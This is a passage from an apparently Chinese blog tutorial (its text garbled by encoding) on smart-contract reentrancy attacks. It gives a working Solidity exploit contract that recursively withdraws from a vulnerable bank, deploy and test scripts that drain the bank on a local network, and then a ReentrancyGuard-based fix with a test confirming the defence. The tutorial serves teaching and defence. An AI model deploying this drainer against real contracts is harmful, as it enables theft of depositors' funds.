<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
pragma solidity ^<span class="hljs-number">0.8</span><span class="hljs-selector-class">.24</span>;

import "./UnsafeBank<span class="hljs-selector-class">.sol</span>";

contract ReentrancyExploit {
    UnsafeBank public immutable bank;
    bool private _isAttacking; <span class="hljs-comment">// æ ‡è®°æ˜¯å¦å¤„äºæ”»å‡»çŠ¶æ€</span>

    <span class="hljs-built_in">constructor</span>(address _bank) {
        bank = <span class="hljs-built_in">UnsafeBank</span>(_bank);
    }
    
    function <span class="hljs-built_in">attack</span>() external payable {
        <span class="hljs-built_in">require</span>(msg.value &gt; <span class="hljs-number">0</span>, "Need ETH to attack");
        _isAttacking = true; <span class="hljs-comment">// å¼€å¯æ”»å‡»çŠ¶æ€</span>
        
        <span class="hljs-comment">// 1. å­˜å…¥èµ„é‡‘</span>
        bank<span class="hljs-selector-class">.deposit</span>{value: msg.value}();
        <span class="hljs-comment">// 2. è§¦å‘ç¬¬ä¸€æ¬¡ææ¬¾</span>
        bank<span class="hljs-selector-class">.withdraw</span>();
        
        _isAttacking = false; <span class="hljs-comment">// ç»“æŸæ”»å‡»çŠ¶æ€</span>
    }

    <span class="hljs-comment">// receive() external payable {</span>
    <span class="hljs-comment">//     // åªæœ‰åœ¨æ”»å‡»çŠ¶æ€ä¸‹ï¼Œä¸”é“¶è¡Œè¿˜æœ‰é’±æ—¶æ‰é‡å…¥</span>
    <span class="hljs-comment">//     if (_isAttacking &amp;&amp; address(bank).balance &gt;= msg.value) {</span>
    <span class="hljs-comment">//         bank.withdraw();</span>
    <span class="hljs-comment">//     }</span>
    <span class="hljs-comment">// }</span>
    <span class="hljs-built_in">receive</span>() external payable {
        <span class="hljs-comment">// å…³é”®ï¼šå¢åŠ ä½™é¢æ£€æŸ¥ï¼Œé˜²æ­¢æ— é™é€’å½’</span>
        <span class="hljs-comment">// åªæœ‰å½“é“¶è¡Œé‡Œè¿˜æœ‰é’±æ—¶ï¼Œæ‰ç»§ç»­ææ¬¾</span>
        if (address(bank)<span class="hljs-selector-class">.balance</span> &gt;= <span class="hljs-number">1</span> ether) { 
            bank<span class="hljs-selector-class">.withdraw</span>();
        }
    }
    function <span class="hljs-built_in">loot</span>() external {
        <span class="hljs-built_in">payable</span>(msg.sender)<span class="hljs-selector-class">.transfer</span>(address(this)<span class="hljs-selector-class">.balance</span>);
    }
}

</code></pre>
<h4 data-id="heading-7">éƒ¨ç½²è„šæœ¬</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// scripts/deploy.js</span>
<span class="hljs-keyword">import</span> { network, artifacts } <span class="hljs-keyword">from</span> <span class="hljs-string">"hardhat"</span>;
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">main</span>(<span class="hljs-params"/>) {
  <span class="hljs-comment">// è¿æ¥ç½‘ç»œ</span>
  <span class="hljs-keyword">const</span> { viem } = <span class="hljs-keyword">await</span> network.<span class="hljs-title function_">connect</span>({ <span class="hljs-attr">network</span>: network.<span class="hljs-property">name</span> });<span class="hljs-comment">//æŒ‡å®šç½‘ç»œè¿›è¡Œé“¾æ¥</span>
  
  <span class="hljs-comment">// è·å–å®¢æˆ·ç«¯</span>
  <span class="hljs-keyword">const</span> [deployer] = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">getWalletClients</span>();
  <span class="hljs-keyword">const</span> publicClient = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">getPublicClient</span>();
 
  <span class="hljs-keyword">const</span> deployerAddress = deployer.<span class="hljs-property">account</span>.<span class="hljs-property">address</span>;
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"éƒ¨ç½²è€…çš„åœ°å€:"</span>, deployerAddress);
  <span class="hljs-comment">// åŠ è½½åˆçº¦</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">UnsafeBankArtifact</span> = <span class="hljs-keyword">await</span> artifacts.<span class="hljs-title function_">readArtifact</span>(<span class="hljs-string">"UnsafeBank"</span>);
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">ReentrancyExploitArtifact</span> = <span class="hljs-keyword">await</span> artifacts.<span class="hljs-title function_">readArtifact</span>(<span class="hljs-string">"ReentrancyExploit"</span>);
 
  <span class="hljs-comment">// éƒ¨ç½²ï¼ˆæ„é€ å‡½æ•°å‚æ•°ï¼šrecipient, initialOwnerï¼‰</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">UnsafeBankHash</span> = <span class="hljs-keyword">await</span> deployer.<span class="hljs-title function_">deployContract</span>({
    <span class="hljs-attr">abi</span>: <span class="hljs-title class_">UnsafeBankArtifact</span>.<span class="hljs-property">abi</span>,<span class="hljs-comment">//è·å–abi</span>
    <span class="hljs-attr">bytecode</span>: <span class="hljs-title class_">UnsafeBankArtifact</span>.<span class="hljs-property">bytecode</span>,<span class="hljs-comment">//ç¡¬ç¼–ç </span>
    <span class="hljs-attr">args</span>: [],<span class="hljs-comment">//</span>
  });
   <span class="hljs-keyword">const</span> <span class="hljs-title class_">UnsafeBankReceipt</span> = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">waitForTransactionReceipt</span>({ <span class="hljs-attr">hash</span>: <span class="hljs-title class_">UnsafeBankHash</span> });
   <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"é“¶è¡Œåˆçº¦åœ°å€:"</span>, <span class="hljs-title class_">UnsafeBankReceipt</span>.<span class="hljs-property">contractAddress</span>);
<span class="hljs-comment">//</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ReentrancyExploitHash</span> = <span class="hljs-keyword">await</span> deployer.<span class="hljs-title function_">deployContract</span>({
    <span class="hljs-attr">abi</span>: <span class="hljs-title class_">ReentrancyExploitArtifact</span>.<span class="hljs-property">abi</span>,<span class="hljs-comment">//è·å–abi</span>
    <span class="hljs-attr">bytecode</span>: <span class="hljs-title class_">ReentrancyExploitArtifact</span>.<span class="hljs-property">bytecode</span>,<span class="hljs-comment">//ç¡¬ç¼–ç </span>
    <span class="hljs-attr">args</span>: [<span class="hljs-title class_">UnsafeBankReceipt</span>.<span class="hljs-property">contractAddress</span>],<span class="hljs-comment">//éƒ¨ç½²è€…åœ°å€ï¼Œåˆå§‹æ‰€æœ‰è€…åœ°å€</span>
  });
  <span class="hljs-comment">// ç­‰å¾…ç¡®è®¤å¹¶æ‰“å°åœ°å€</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title class_">ReentrancyExploitReceipt</span> = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">waitForTransactionReceipt</span>({ <span class="hljs-attr">hash</span>: <span class="hljs-title class_">ReentrancyExploitHash</span> });
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æ”»å‡»åˆçº¦åœ°å€:"</span>, <span class="hljs-title class_">ReentrancyExploitReceipt</span>.<span class="hljs-property">contractAddress</span>);
}

<span class="hljs-title function_">main</span>().<span class="hljs-title function_">catch</span>(<span class="hljs-variable language_">console</span>.<span class="hljs-property">error</span>);
</code></pre>
<h4 data-id="heading-8">æµ‹è¯•è„šæœ¬</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> assert <span class="hljs-keyword">from</span> <span class="hljs-string">"node:assert/strict"</span>;
<span class="hljs-keyword">import</span> { describe, it, beforeEach } <span class="hljs-keyword">from</span> <span class="hljs-string">"node:test"</span>;
<span class="hljs-keyword">import</span> hre <span class="hljs-keyword">from</span> <span class="hljs-string">"hardhat"</span>;
<span class="hljs-keyword">import</span> { parseEther, getAddress, formatEther } <span class="hljs-keyword">from</span> <span class="hljs-string">"viem"</span>;

<span class="hljs-title function_">describe</span>(<span class="hljs-string">"ReentrancyExploit æ”»å‡»éªŒè¯"</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-keyword">let</span> <span class="hljs-attr">owner</span>: <span class="hljs-built_in">any</span>;
  <span class="hljs-keyword">let</span> <span class="hljs-attr">otherAccount</span>: <span class="hljs-built_in">any</span>;
  <span class="hljs-keyword">let</span> <span class="hljs-title class_">UnsafeBank</span>: <span class="hljs-built_in">any</span>;
  <span class="hljs-keyword">let</span> <span class="hljs-title class_">ReentrancyExploit</span>: <span class="hljs-built_in">any</span>;
  <span class="hljs-keyword">let</span> <span class="hljs-attr">publicClient</span>: <span class="hljs-built_in">any</span>;

  <span class="hljs-title function_">beforeEach</span>(<span class="hljs-keyword">async</span> () =&gt; {
    <span class="hljs-comment">// const viem = await (hre as any).viem;</span>
    <span class="hljs-keyword">const</span> { viem } = <span class="hljs-keyword">await</span> hre.<span class="hljs-property">network</span>.<span class="hljs-title function_">connect</span>();
    publicClient = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">getPublicClient</span>();
    [owner, otherAccount] = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">getWalletClients</span>();

    <span class="hljs-comment">// 1. éƒ¨ç½²é“¶è¡Œ</span>
    <span class="hljs-title class_">UnsafeBank</span> = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">deployContract</span>(<span class="hljs-string">"UnsafeBank"</span>, []);

    <span class="hljs-comment">// 2. æ³¨å…¥â€œå—å®³è€…â€èµ„é‡‘ï¼šè®©å…¶ä»–è´¦æˆ·å¾€é“¶è¡Œå­˜å…¥ 100 ETH</span>
    <span class="hljs-comment">// è¿™æ ·é“¶è¡Œæ‰æœ‰é’±è¢«å·ï¼Œä¸”ä¸ä¼šæ¶ˆè€— owner è‡ªå·±çš„æœ¬é‡‘</span>
    <span class="hljs-keyword">const</span> depositTx = <span class="hljs-keyword">await</span> otherAccount.<span class="hljs-title function_">sendTransaction</span>({
      <span class="hljs-attr">to</span>: <span class="hljs-title class_">UnsafeBank</span>.<span class="hljs-property">address</span>,
      <span class="hljs-attr">value</span>: <span class="hljs-title function_">parseEther</span>(<span class="hljs-string">"100"</span>),
      <span class="hljs-attr">data</span>: <span class="hljs-string">"0xd0e30db0"</span>, <span class="hljs-comment">// è°ƒç”¨ deposit() çš„ selector</span>
    });
    <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">waitForTransactionReceipt</span>({ <span class="hljs-attr">hash</span>: depositTx });
        
    <span class="hljs-comment">// 3. éƒ¨ç½²æ”»å‡»åˆçº¦</span>
    <span class="hljs-title class_">ReentrancyExploit</span> = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">deployContract</span>(<span class="hljs-string">"ReentrancyExploit"</span>, [<span class="hljs-title class_">UnsafeBank</span>.<span class="hljs-property">address</span>]);
  });

  <span class="hljs-title function_">it</span>(<span class="hljs-string">"åº”è¯¥é€šè¿‡é‡å…¥æ”»å‡»æ’å¹²é“¶è¡Œä½™é¢"</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">const</span> initialBankBal = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">getBalance</span>({ <span class="hljs-attr">address</span>: <span class="hljs-title class_">UnsafeBank</span>.<span class="hljs-property">address</span> });
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æ”»å‡»å‰é“¶è¡Œä½™é¢:"</span>, <span class="hljs-title function_">formatEther</span>(initialBankBal.<span class="hljs-title function_">toString</span>()));

    <span class="hljs-comment">// 1. æ‰§è¡Œæ”»å‡» (å­˜å…¥ 10 ETH è§¦å‘é€’å½’ withdraw)</span>
    <span class="hljs-comment">// æ³¨æ„ï¼šgasLimit å¿…é¡»ç»™å¤Ÿï¼Œå› ä¸ºé€’å½’éå¸¸æ¶ˆè€— Gas</span>
    <span class="hljs-keyword">const</span> attackTx = <span class="hljs-keyword">await</span> <span class="hljs-title class_">ReentrancyExploit</span>.<span class="hljs-property">write</span>.<span class="hljs-title function_">attack</span>([], {
      <span class="hljs-attr">value</span>: <span class="hljs-title function_">parseEther</span>(<span class="hljs-string">"10"</span>),
      <span class="hljs-attr">gas</span>: <span class="hljs-number">1000000n</span> 
    });
    <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">waitForTransactionReceipt</span>({ <span class="hljs-attr">hash</span>: attackTx });

    <span class="hljs-comment">// 2. æ£€æŸ¥æ”»å‡»åˆçº¦æ˜¯å¦æˆåŠŸæ‹¿åˆ°äº†é’±</span>
    <span class="hljs-keyword">const</span> exploitBal = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">getBalance</span>({ <span class="hljs-attr">address</span>: <span class="hljs-title class_">ReentrancyExploit</span>.<span class="hljs-property">address</span> });
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æ”»å‡»ååˆçº¦æ‰€å¾—:"</span>, <span class="hljs-title function_">formatEther</span>(exploitBal.<span class="hljs-title function_">toString</span>()));
    
    <span class="hljs-comment">// ä¿®å¤æ–­è¨€ 1ï¼šåˆçº¦æ‰€å¾—åº”è¯¥ç­‰äº (é“¶è¡Œåˆå§‹ 100 + æ”»å‡»æŠ•å…¥ 10)</span>
    assert.<span class="hljs-title function_">ok</span>(exploitBal &gt;= <span class="hljs-title function_">parseEther</span>(<span class="hljs-string">"110"</span>));

    <span class="hljs-comment">// æå–æˆ˜åˆ©å“</span>
    <span class="hljs-keyword">const</span> initialOwnerBal = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">getBalance</span>({ <span class="hljs-attr">address</span>: owner.<span class="hljs-property">account</span>.<span class="hljs-property">address</span> });
    <span class="hljs-keyword">await</span> <span class="hljs-title class_">ReentrancyExploit</span>.<span class="hljs-property">write</span>.<span class="hljs-title function_">loot</span>([]);

    <span class="hljs-comment">// ä¿®å¤æ–­è¨€ 2ï¼šOwner ä½™é¢å¢åŠ é‡åº”è¯¥æ¥è¿‘ 110 ETHï¼ˆæ‰£é™¤å¾®é‡ Gasï¼‰</span>
    <span class="hljs-keyword">const</span> finalOwnerBal = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">getBalance</span>({ <span class="hljs-attr">address</span>: owner.<span class="hljs-property">account</span>.<span class="hljs-property">address</span> });

    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"Owner å¢åŠ ä½™é¢:"</span>, (finalOwnerBal - initialOwnerBal).<span class="hljs-title function_">toString</span>());
    
    <span class="hljs-comment">// åªè¦å¢åŠ è¶…è¿‡ 109 ETH å³å¯è¯´æ˜æˆåŠŸæ‹¿åˆ°äº†é“¶è¡Œçš„æ‰€æœ‰é’±</span>
    assert.<span class="hljs-title function_">ok</span>(finalOwnerBal &gt; initialOwnerBal + <span class="hljs-title function_">parseEther</span>(<span class="hljs-string">"109"</span>));
    
    <span class="hljs-comment">// ä¿®å¤æ–­è¨€ 3ï¼šé“¶è¡Œå¿…é¡»è¢«æ’å¹²</span>
    <span class="hljs-keyword">const</span> finalBankBal = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">getBalance</span>({ <span class="hljs-attr">address</span>: <span class="hljs-title class_">UnsafeBank</span>.<span class="hljs-property">address</span> });
    assert.<span class="hljs-title function_">equal</span>(finalBankBal, <span class="hljs-number">0n</span>);
  });
});
</code></pre>
<h3 data-id="heading-9">æ¼æ´ä¿®å¤</h3>
<h4 data-id="heading-10">æ™ºèƒ½åˆçº¦</h4>
<ul>
<li><strong>å®‰å…¨æ¼æ´ä¿®å¤åˆçº¦</strong>:å€ŸåŠ©openzeppelinV5ä¿®å¤</li>
</ul>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
pragma solidity ^<span class="hljs-number">0.8</span>.<span class="hljs-number">24</span>;

<span class="hljs-comment">// å¯¼å…¥ OpenZeppelin V5 çš„é˜²é‡å…¥å«å£«</span>
import <span class="hljs-string">"@openzeppelin/contracts/utils/ReentrancyGuard.sol"</span>;

<span class="hljs-comment">/**
 * <span class="hljs-doctag">@title</span> SafeBank
 * <span class="hljs-doctag">@dev</span> ä¿®å¤äº†é‡å…¥æ¼æ´çš„å®‰å…¨é“¶è¡Œåˆçº¦
 */</span>
contract SafeBank is ReentrancyGuard {
    <span class="hljs-title function_ invoke__">mapping</span>(address =&gt; uint256) <span class="hljs-keyword">public</span> balances;

    <span class="hljs-comment">// å­˜é’±é€»è¾‘ä¿æŒä¸å˜</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"/>) <span class="hljs-title">external</span> <span class="hljs-title">payable</span> </span>{
        balances[msg.sender] += msg.value;
    }

    <span class="hljs-comment">/**
     * <span class="hljs-doctag">@dev</span> ä¿®å¤åçš„å–æ¬¾å‡½æ•°
     * 1. ä½¿ç”¨ nonReentrant ä¿®æ”¹å™¨ï¼šç¦æ­¢åœ¨æ‰§è¡ŒæœŸé—´å†æ¬¡è¿›å…¥æ­¤å‡½æ•°
     * 2. éµå¾ª Checks-Effects-Interactions æ¨¡å¼
     */</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"/>) <span class="hljs-title">external</span> <span class="hljs-title">nonReentrant</span> </span>{
        <span class="hljs-comment">// --- 1. Checks (æ£€æŸ¥) ---</span>
        uint256 amount = balances[msg.sender];
        <span class="hljs-keyword">require</span>(amount &gt; <span class="hljs-number">0</span>, <span class="hljs-string">"no fund"</span>);

        <span class="hljs-comment">// --- 2. Effects (æ•ˆæœ) ---</span>
        <span class="hljs-comment">// åœ¨è¿›è¡Œå¤–éƒ¨è°ƒç”¨ä¹‹å‰ï¼Œå…ˆæ›´æ–°çŠ¶æ€ï¼ˆè´¦æœ¬æ¸…é›¶ï¼‰</span>
        <span class="hljs-comment">// å³ä½¿æ”»å‡»è€…å°è¯•é‡å…¥ï¼Œæ­¤æ—¶å®ƒçš„ balances[msg.sender] å·²ç»æ˜¯ 0ï¼Œæ— æ³•é€šè¿‡ Checks</span>
        balances[msg.sender] = <span class="hljs-number">0</span>;

        <span class="hljs-comment">// --- 3. Interactions (äº¤äº’) ---</span>
        <span class="hljs-comment">// æœ€åå†è¿›è¡Œå¤–éƒ¨è½¬è´¦</span>
        (<span class="hljs-keyword">bool</span> ok, ) = msg.sender.call{value: amount}(<span class="hljs-string">""</span>);
        <span class="hljs-keyword">require</span>(ok, <span class="hljs-string">"send failed"</span>);
    }

    <span class="hljs-comment">// å…è®¸åˆçº¦æ¥æ”¶ ETH</span>
    <span class="hljs-title function_ invoke__">receive</span>() external payable {}
}

</code></pre>
<ul>
<li><strong>é‡å…¥æ”»å‡»åˆçº¦</strong>ï¼šåŒä¸Šé‡å…¥æ”»å‡»åˆçº¦</li>
</ul>
<h4 data-id="heading-11">éƒ¨ç½²è„šæœ¬ï¼šåŒä¸Šéƒ¨ç½²è„šæœ¬ä¿®æ”¹ç¼–è¯‘åabiå…³é”®å‚æ•°å³å¯</h4>
<h4 data-id="heading-12">æµ‹è¯•è„šæœ¬</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">import</span> assert <span class="hljs-keyword">from</span> <span class="hljs-string">"node:assert/strict"</span>;
<span class="hljs-keyword">import</span> { describe, it, beforeEach } <span class="hljs-keyword">from</span> <span class="hljs-string">"node:test"</span>;
<span class="hljs-keyword">import</span> hre <span class="hljs-keyword">from</span> <span class="hljs-string">"hardhat"</span>;
<span class="hljs-keyword">import</span> { parseEther, getAddress, formatEther } <span class="hljs-keyword">from</span> <span class="hljs-string">"viem"</span>;
<span class="hljs-title function_">describe</span>(<span class="hljs-string">"SafeBank é˜²å¾¡éªŒè¯"</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
    <span class="hljs-keyword">let</span> <span class="hljs-attr">owner</span>: <span class="hljs-built_in">any</span>;
    <span class="hljs-keyword">let</span> <span class="hljs-attr">otherAccount</span>: <span class="hljs-built_in">any</span>;
    <span class="hljs-keyword">let</span> <span class="hljs-title class_">SafeBank</span>: <span class="hljs-built_in">any</span>; <span class="hljs-comment">// ä½¿ç”¨ SafeBank ä»£æ›¿ UnsafeBank</span>
    <span class="hljs-keyword">let</span> <span class="hljs-title class_">ReentrancyExploit</span>: <span class="hljs-built_in">any</span>;
    <span class="hljs-keyword">let</span> <span class="hljs-attr">publicClient</span>: <span class="hljs-built_in">any</span>;

    <span class="hljs-title function_">beforeEach</span>(<span class="hljs-keyword">async</span> () =&gt; {
        <span class="hljs-keyword">const</span> { viem } = <span class="hljs-keyword">await</span> hre.<span class="hljs-property">network</span>.<span class="hljs-title function_">connect</span>();
        publicClient = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">getPublicClient</span>();
        [owner, otherAccount] = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">getWalletClients</span>();

        <span class="hljs-comment">// 1. éƒ¨ç½²å®‰å…¨çš„é“¶è¡Œåˆçº¦</span>
        <span class="hljs-title class_">SafeBank</span> = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">deployContract</span>(<span class="hljs-string">"SafeBank"</span>, []); <span class="hljs-comment">// æ³¨æ„åˆçº¦åç§°å˜æ›´</span>
        
        <span class="hljs-comment">// 2. æ³¨å…¥â€œå—å®³è€…â€èµ„é‡‘ï¼š100 ETH</span>
        <span class="hljs-keyword">const</span> depositTx = <span class="hljs-keyword">await</span> otherAccount.<span class="hljs-title function_">sendTransaction</span>({
            <span class="hljs-attr">to</span>: <span class="hljs-title class_">SafeBank</span>.<span class="hljs-property">address</span>,
            <span class="hljs-attr">value</span>: <span class="hljs-title function_">parseEther</span>(<span class="hljs-string">"100"</span>),
            <span class="hljs-attr">data</span>: <span class="hljs-string">"0xd0e30db0"</span>, <span class="hljs-comment">// è°ƒç”¨ deposit() çš„ selector</span>
        });
        <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">waitForTransactionReceipt</span>({ <span class="hljs-attr">hash</span>: depositTx });
            
        <span class="hljs-comment">// 3. éƒ¨ç½²æ”»å‡»åˆçº¦ï¼ŒæŒ‡å‘ SafeBank</span>
        <span class="hljs-title class_">ReentrancyExploit</span> = <span class="hljs-keyword">await</span> viem.<span class="hljs-title function_">deployContract</span>(<span class="hljs-string">"ReentrancyExploit"</span>, [<span class="hljs-title class_">SafeBank</span>.<span class="hljs-property">address</span>]);
    });

    <span class="hljs-title function_">it</span>(<span class="hljs-string">"åº”è¯¥é˜»æ­¢ ReentrancyExploit çš„æ”»å‡»"</span>, <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
        <span class="hljs-keyword">const</span> initialBankBal = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">getBalance</span>({ <span class="hljs-attr">address</span>: <span class="hljs-title class_">SafeBank</span>.<span class="hljs-property">address</span> });
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å®‰å…¨é“¶è¡Œæ”»å‡»å‰ä½™é¢:"</span>, <span class="hljs-title function_">formatEther</span>(initialBankBal.<span class="hljs-title function_">toString</span>())); <span class="hljs-comment">// 100 ETH</span>

        <span class="hljs-comment">// å°è¯•æ‰§è¡Œæ”»å‡»</span>
        <span class="hljs-comment">// æˆ‘ä»¬é¢„æœŸè¿™ä¸ªäº¤æ˜“ä¼šå¤±è´¥ï¼ˆrevertï¼‰ï¼Œå› ä¸º SafeBank ä½¿ç”¨äº† ReentrancyGuard</span>
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">await</span> <span class="hljs-title class_">ReentrancyExploit</span>.<span class="hljs-property">write</span>.<span class="hljs-title function_">attack</span>([], {
                <span class="hljs-attr">value</span>: <span class="hljs-title function_">parseEther</span>(<span class="hljs-string">"10"</span>), <span class="hljs-comment">// å­˜å…¥ 10 ETH</span>
                <span class="hljs-attr">gas</span>: <span class="hljs-number">3000000n</span> <span class="hljs-comment">// Gas ä¸ç”¨å¤ªé«˜ï¼Œå› ä¸ºå®ƒå¾ˆå¿«å°±ä¼šå¤±è´¥</span>
            });
            <span class="hljs-comment">// å¦‚æœä»£ç æ‰§è¡Œåˆ°è¿™é‡Œï¼Œè¯´æ˜æ”»å‡»æˆåŠŸäº†ï¼Œè¿™ä¸ç¬¦åˆé¢„æœŸ</span>
            assert.<span class="hljs-title function_">fail</span>(<span class="hljs-string">"æ”»å‡»åº”è¯¥å¤±è´¥ï¼Œä½†å®ƒæˆåŠŸäº†ï¼"</span>);

        } <span class="hljs-keyword">catch</span> (<span class="hljs-attr">error</span>: <span class="hljs-built_in">any</span>) {
            <span class="hljs-comment">// é¢„æœŸæ•è·åˆ°é”™è¯¯ï¼Œè¯æ˜é˜²å¾¡æˆåŠŸ</span>
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"æˆåŠŸæ•è·åˆ°é¢„æœŸé”™è¯¯ï¼šæ”»å‡»è¢«é˜»æ­¢ã€‚"</span>);
            <span class="hljs-comment">// æ‰“å°é”™è¯¯æ¶ˆæ¯é€šå¸¸ä¼šåŒ…å« "ReentrancyGuard: reentrant call" æˆ– "no fund"</span>
            <span class="hljs-comment">// console.error(error.message); </span>
            assert.<span class="hljs-title function_">ok</span>(error.<span class="hljs-property">message</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">"revert"</span>) || error.<span class="hljs-property">message</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">"ReentrancyGuard"</span>) || error.<span class="hljs-property">message</span>.<span class="hljs-title function_">includes</span>(<span class="hljs-string">"no fund"</span>));
        }

        <span class="hljs-comment">// éªŒè¯æœ€ç»ˆé“¶è¡Œä½™é¢ï¼šé’±åº”è¯¥è¿˜åœ¨é“¶è¡Œé‡Œï¼ˆé™¤äº†æ”»å‡»è€…å­˜å…¥çš„ 10 ETH å¯èƒ½å¡åœ¨å¤±è´¥çš„äº¤æ˜“ä¸­ï¼‰</span>
        <span class="hljs-comment">// åœ¨ Viem/Hardhat ä¸­ï¼Œå¤±è´¥çš„äº¤æ˜“ä¼šè‡ªåŠ¨å›æ»šæ‰€æœ‰çŠ¶æ€ï¼Œæ‰€ä»¥é“¶è¡Œä½™é¢åº”è¯¥å›åˆ°åˆå§‹çŠ¶æ€ã€‚</span>
        <span class="hljs-keyword">const</span> finalBankBal = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">getBalance</span>({ <span class="hljs-attr">address</span>: <span class="hljs-title class_">SafeBank</span>.<span class="hljs-property">address</span> });
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"å®‰å…¨é“¶è¡Œæ”»å‡»åä½™é¢:"</span>, <span class="hljs-title function_">formatEther</span>(finalBankBal.<span class="hljs-title function_">toString</span>()));

        <span class="hljs-comment">// æ–­è¨€é“¶è¡Œä½™é¢æ²¡æœ‰è¢«æç©º (å›åˆ°äº† 100 ETH é™„è¿‘)</span>
        assert.<span class="hljs-title function_">ok</span>(finalBankBal &gt;= <span class="hljs-title function_">parseEther</span>(<span class="hljs-string">"99"</span>)); 

        <span class="hljs-keyword">const</span> exploitBal = <span class="hljs-keyword">await</span> publicClient.<span class="hljs-title function_">getBalance</span>({ <span class="hljs-attr">address</span>: <span class="hljs-title class_">ReentrancyExploit</span>.<span class="hljs-property">address</span> });
        assert.<span class="hljs-title function_">equal</span>(exploitBal, <span class="hljs-number">0n</span>, <span class="hljs-string">"æ”»å‡»åˆçº¦ä¸åº”è¯¥æœ‰ä½™é¢"</span>);
    });
});
</code></pre>
<h2 data-id="heading-13">ç»“è¯­</h2>
<p>è‡³æ­¤å…³äº DeFi é¢†åŸŸç»å…¸å®‰å…¨æ¼æ´ â€”â€” é‡å…¥æ”»å‡»ï¼Œå®Œæ•´è¦†ç›–ç›¸å…³ç†è®ºçŸ¥è¯†ä¸ä»£ç å®è·µï¼Œæ—¢åŒ…å«é‡å…¥æ”»å‡»çš„å¤ç°è¿‡ç¨‹ï¼Œä¹Ÿæä¾›äº†é’ˆå¯¹è¯¥æ¼æ´çš„ä¿®å¤ä»£ç å®ä¾‹ï¼Œå½¢æˆ â€œç†è®ºå‰–æ - å®è·µå¤ç° - æ¼æ´ä¿®å¤â€ çš„å®Œæ•´æŠ€æœ¯é“¾è·¯ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç½‘é¡µç«¯è¯­éŸ³è¯†åˆ«æŠ€æœ¯ä½¿ç”¨æ–¹æ¡ˆ]]></title>    <link>https://juejin.cn/post/7596970073749454884</link>    <guid>https://juejin.cn/post/7596970073749454884</guid>    <pubDate>2026-01-20T00:30:18.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596970073749454884" data-draft-id="7596966040920948742" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç½‘é¡µç«¯è¯­éŸ³è¯†åˆ«æŠ€æœ¯ä½¿ç”¨æ–¹æ¡ˆ"/> <meta itemprop="keywords" content="å‰ç«¯"/> <meta itemprop="datePublished" content="2026-01-20T00:30:18.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" 